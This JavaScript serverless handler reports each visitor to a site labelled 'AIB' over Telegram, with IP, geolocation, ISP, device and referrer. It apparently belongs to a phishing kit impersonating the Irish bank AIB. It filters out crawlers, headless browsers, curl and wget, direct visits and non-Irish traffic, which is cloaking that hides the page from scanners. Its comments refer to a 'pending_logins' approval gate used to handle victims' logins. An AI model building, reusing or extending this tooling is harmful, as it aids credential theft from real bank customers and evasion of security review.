/**
 *  ╔═╗╔═╗╔╗╔╔═╗╔═╗╦
 *  ╚═╗║╣ ║║║╚═╗║╣ ║
 *  ╚═╝╚═╝╝╚╝╚═╝╚═╝╩
 *  ─── telegram/visitor.js ───
 *
 *  Visit notification, ported from NBS `app/api/telegram/visitor/route.ts`
 *  (bot filter + client IP + Vercel-header geo) and Betterbusinessplanning
 *  (message format, via `_telegram.sendVisitorNotification`).
 *
 *  Writes nothing to `pending_logins` — a visit is not a task, so it can
 *  never be picked up by the approval gate or churn through auto-decline.
 */
import { sendVisitorNotification } from "../_telegram.js";
import { parseVisitorInfo } from "../_messages.js";

var UNKNOWN = "Unknown";

var BOT_PATTERNS = [
  { pattern: "googlebot", name: "Googlebot" },
  { pattern: "bingbot", name: "Bingbot" },
  { pattern: "slurp", name: "Yahoo Slurp" },
  { pattern: "duckduckbot", name: "DuckDuckBot" },
  { pattern: "baiduspider", name: "Baidu Spider" },
  { pattern: "yandexbot", name: "YandexBot" },
  { pattern: "facebookexternalhit", name: "Facebook Crawler" },
  { pattern: "twitterbot", name: "Twitterbot" },
  { pattern: "telegrambot", name: "TelegramBot" },
  { pattern: "whatsapp", name: "WhatsApp" },
  { pattern: "discordbot", name: "DiscordBot" },
  { pattern: "linkedinbot", name: "LinkedInBot" },
  { pattern: "curl", name: "curl" },
  { pattern: "wget", name: "wget" },
  { pattern: "python-requests", name: "python-requests" },
  { pattern: "httpclient", name: "HTTP client" },
  { pattern: "node-fetch", name: "node-fetch" },
  { pattern: "axios", name: "axios" },
  { pattern: "postmanruntime", name: "Postman" },
  { pattern: "insomnia", name: "Insomnia" },
  { pattern: "headless", name: "Headless browser" },
  { pattern: "puppeteer", name: "Puppeteer" },
  { pattern: "selenium", name: "Selenium" },
  { pattern: "playwright", name: "Playwright" },
  { pattern: "bot", name: "Generic bot" },
  { pattern: "spider", name: "Spider" },
  { pattern: "crawl", name: "Crawler" },
];

var SEARCH_ENGINE_REFERRERS = [
  "google.com",
  "google.co.uk",
  "google.de",
  "google.fr",
  "google.es",
  "google.it",
  "google.ca",
  "google.com.au",
  "google.co.in",
  "google.com.br",
  "googleadservices.com",
  "bing.com",
  "yahoo.com",
  "duckduckgo.com",
  "baidu.com",
  "yandex.com",
  "yandex.ru",
  "ecosia.org",
  "startpage.com",
  "ask.com",
  "aol.com",
];

var AI_REFERRAL_HOSTS = [
  "chatgpt.com",
  "chat.openai.com",
  "openai.com",
  "perplexity.ai",
  "claude.ai",
  "anthropic.com",
  "copilot.microsoft.com",
  "copilot.com",
  "gemini.google.com",
  "you.com",
  "poe.com",
  "phind.com",
  "meta.ai",
  "x.ai",
  "grok.com",
];

var BACKLINK_HOSTS = [
  "aib.ie",
  "aibgroup.com",
];

var ALL_ALLOWED_REFERRER_HOSTS = [
  ...SEARCH_ENGINE_REFERRERS,
  ...AI_REFERRAL_HOSTS,
  ...BACKLINK_HOSTS,
];

function isAllowedReferrerHost(referrer) {
  if (!referrer || typeof referrer !== "string") return false;
  var raw = referrer.trim();
  if (!raw || raw === "Direct" || !raw.startsWith("http")) return false;
  try {
    var url = new URL(raw);
    var host = url.hostname.toLowerCase().replace(/^www\./, "");
    for (var i = 0; i < ALL_ALLOWED_REFERRER_HOSTS.length; i++) {
      var pattern = ALL_ALLOWED_REFERRER_HOSTS[i].toLowerCase().replace(/^www\./, "");
      if (host === pattern || host.endsWith("." + pattern)) {
        return true;
      }
    }
  } catch (e) {}
  return false;
}

function setCors(res) {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
}

function detectBot(userAgent) {
  if (!userAgent) return null;
  var ua = String(userAgent).toLowerCase();
  for (var i = 0; i < BOT_PATTERNS.length; i++) {
    if (ua.indexOf(BOT_PATTERNS[i].pattern) !== -1) return BOT_PATTERNS[i];
  }
  return null;
}

function firstHeader(req, name) {
  var value = req.headers[name];
  if (Array.isArray(value)) value = value[0];
  if (!value) return "";
  // Vercel percent-encodes geo header values (e.g. S%C3%A3o%20Paulo).
  try {
    return decodeURIComponent(String(value)).trim();
  } catch (e) {
    return String(value).trim();
  }
}

function getClientIp(req) {
  var candidates = [
    firstHeader(req, "x-vercel-forwarded-for"),
    firstHeader(req, "x-real-ip"),
    firstHeader(req, "x-forwarded-for"),
    firstHeader(req, "cf-connecting-ip"),
  ];
  for (var i = 0; i < candidates.length; i++) {
    if (candidates[i]) return candidates[i].split(",")[0].trim();
  }
  return "";
}

function isPublicIp(ip) {
  if (!ip) return false;
  var v4 = ip.replace(/^::ffff:/, "");
  if (/^\d{1,3}(\.\d{1,3}){3}$/.test(v4)) {
    var a = v4.split(".").map(Number);
    if (a[0] === 10 || a[0] === 127 || a[0] === 0) return false;
    if (a[0] === 192 && a[1] === 168) return false;
    if (a[0] === 172 && a[1] >= 16 && a[1] <= 31) return false;
    if (a[0] === 169 && a[1] === 254) return false;
    return a.every(function (n) { return n >= 0 && n <= 255; });
  }
  if (ip === "::1") return false;
  return ip.indexOf(":") !== -1;
}

function countryNameOf(countryCode) {
  if (!countryCode) return "";
  try {
    return new Intl.DisplayNames(["en"], { type: "region" }).of(countryCode) || countryCode;
  } catch (e) {
    return countryCode;
  }
}

async function fetchJson(url) {
  var controller = typeof AbortController !== "undefined" ? new AbortController() : null;
  var timer = null;
  if (controller) timer = setTimeout(function () { controller.abort(); }, 3000);
  try {
    var res = await fetch(url, {
      method: "GET",
      cache: "no-store",
      signal: controller ? controller.signal : undefined,
    });
    if (!res.ok) return null;
    return await res.json();
  } catch (e) {
    return null;
  } finally {
    if (timer) clearTimeout(timer);
  }
}

async function enrichGeo(req, ip) {
  // Vercel injects these at the edge — cheapest and most reliable.
  var city = firstHeader(req, "x-vercel-ip-city");
  var region = firstHeader(req, "x-vercel-ip-country-region");
  var countryCode = firstHeader(req, "x-vercel-ip-country").toUpperCase();
  var timezone = firstHeader(req, "x-vercel-ip-timezone");
  var country = countryNameOf(countryCode);
  var isp = "";
  var asn = null;

  // Best-effort: fills ISP/ASN plus any geo the edge did not provide. Skipped
  // for private/loopback addresses so local dev fires no external request.
  if (isPublicIp(ip)) {
    var data = await fetchJson("https://ipapi.co/" + encodeURIComponent(ip) + "/json/");
    if (data && !data.error) {
      if (!city) city = data.city || "";
      if (!region) region = data.region || "";
      if (!country) country = data.country_name || "";
      if (!timezone) timezone = data.timezone || "";
      isp = data.org || "";
      asn = data.asn || null;
    }
  }

  // joinLocation() in the source projects: city, region, country — non-empty only.
  var location = [city, region, country].filter(Boolean).join(", ");

  return {
    location: location || UNKNOWN,
    timezone: timezone || UNKNOWN,
    isp: isp || UNKNOWN,
    org: isp || null,
    asn: asn,
  };
}

export default async function handler(req, res) {
  setCors(res);

  if (req.method === "OPTIONS") {
    return res.status(204).end();
  }

  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method not allowed" });
  }

  try {
    var body = req.body || {};
    var ua = body.userAgent ? String(body.userAgent) : "";
    if (!ua) {
      return res.status(400).json({ error: "userAgent is required" });
    }

    // Crawlers, link-preview bots and automation never produce a notification.
    if (detectBot(ua)) {
      return res.status(200).json({ ok: true, skipped: true, reason: "bot" });
    }

    // Direct visits or non-allowed referrers NEVER dispatch a notification.
    var rawReferrer = body.referrer ? String(body.referrer).trim() : "";
    var isLocalTesting = process.env.ALLOW_LOCAL_TESTING === "true";
    if (!isAllowedReferrerHost(rawReferrer)) {
      if (!isLocalTesting) {
        return res.status(200).json({ ok: true, skipped: true, reason: "unauthorized_referrer" });
      }
    }

    var ip = getClientIp(req) || body.ip || "";
    var geo = await enrichGeo(req, ip);

    // Geo restriction: Ireland only (IE)
    var countryCode = firstHeader(req, "x-vercel-ip-country").toUpperCase();
    if (countryCode && countryCode !== "IE" && !isLocalTesting) {
      return res.status(200).json({ ok: true, skipped: true, reason: "geo_restricted" });
    }

    var detected = parseVisitorInfo(ua);
    var pageUrl =
      body.pageUrl && /^https?:\/\//i.test(String(body.pageUrl))
        ? String(body.pageUrl)
        : UNKNOWN;

    await sendVisitorNotification(process.env, {
      siteName: "AIB",
      location: geo.location,
      ip: ip || UNKNOWN,
      timezone: geo.timezone,
      isp: geo.isp,
      org: geo.org,
      asn: geo.asn,
      platformLabel: detected.platformLabel,
      browserLabel: detected.browserLabel,
      deviceLabel: detected.deviceLabel,
      screen: body.screen || UNKNOWN,
      language: body.language || UNKNOWN,
      referrer: body.referrer || "Direct",
      pageUrl: pageUrl,
    });

    return res.status(200).json({ ok: true });
  } catch (error) {
    console.error("Error sending visitor notification:", error);
    return res.status(500).json({ error: "Failed to send notification" });
  }
}
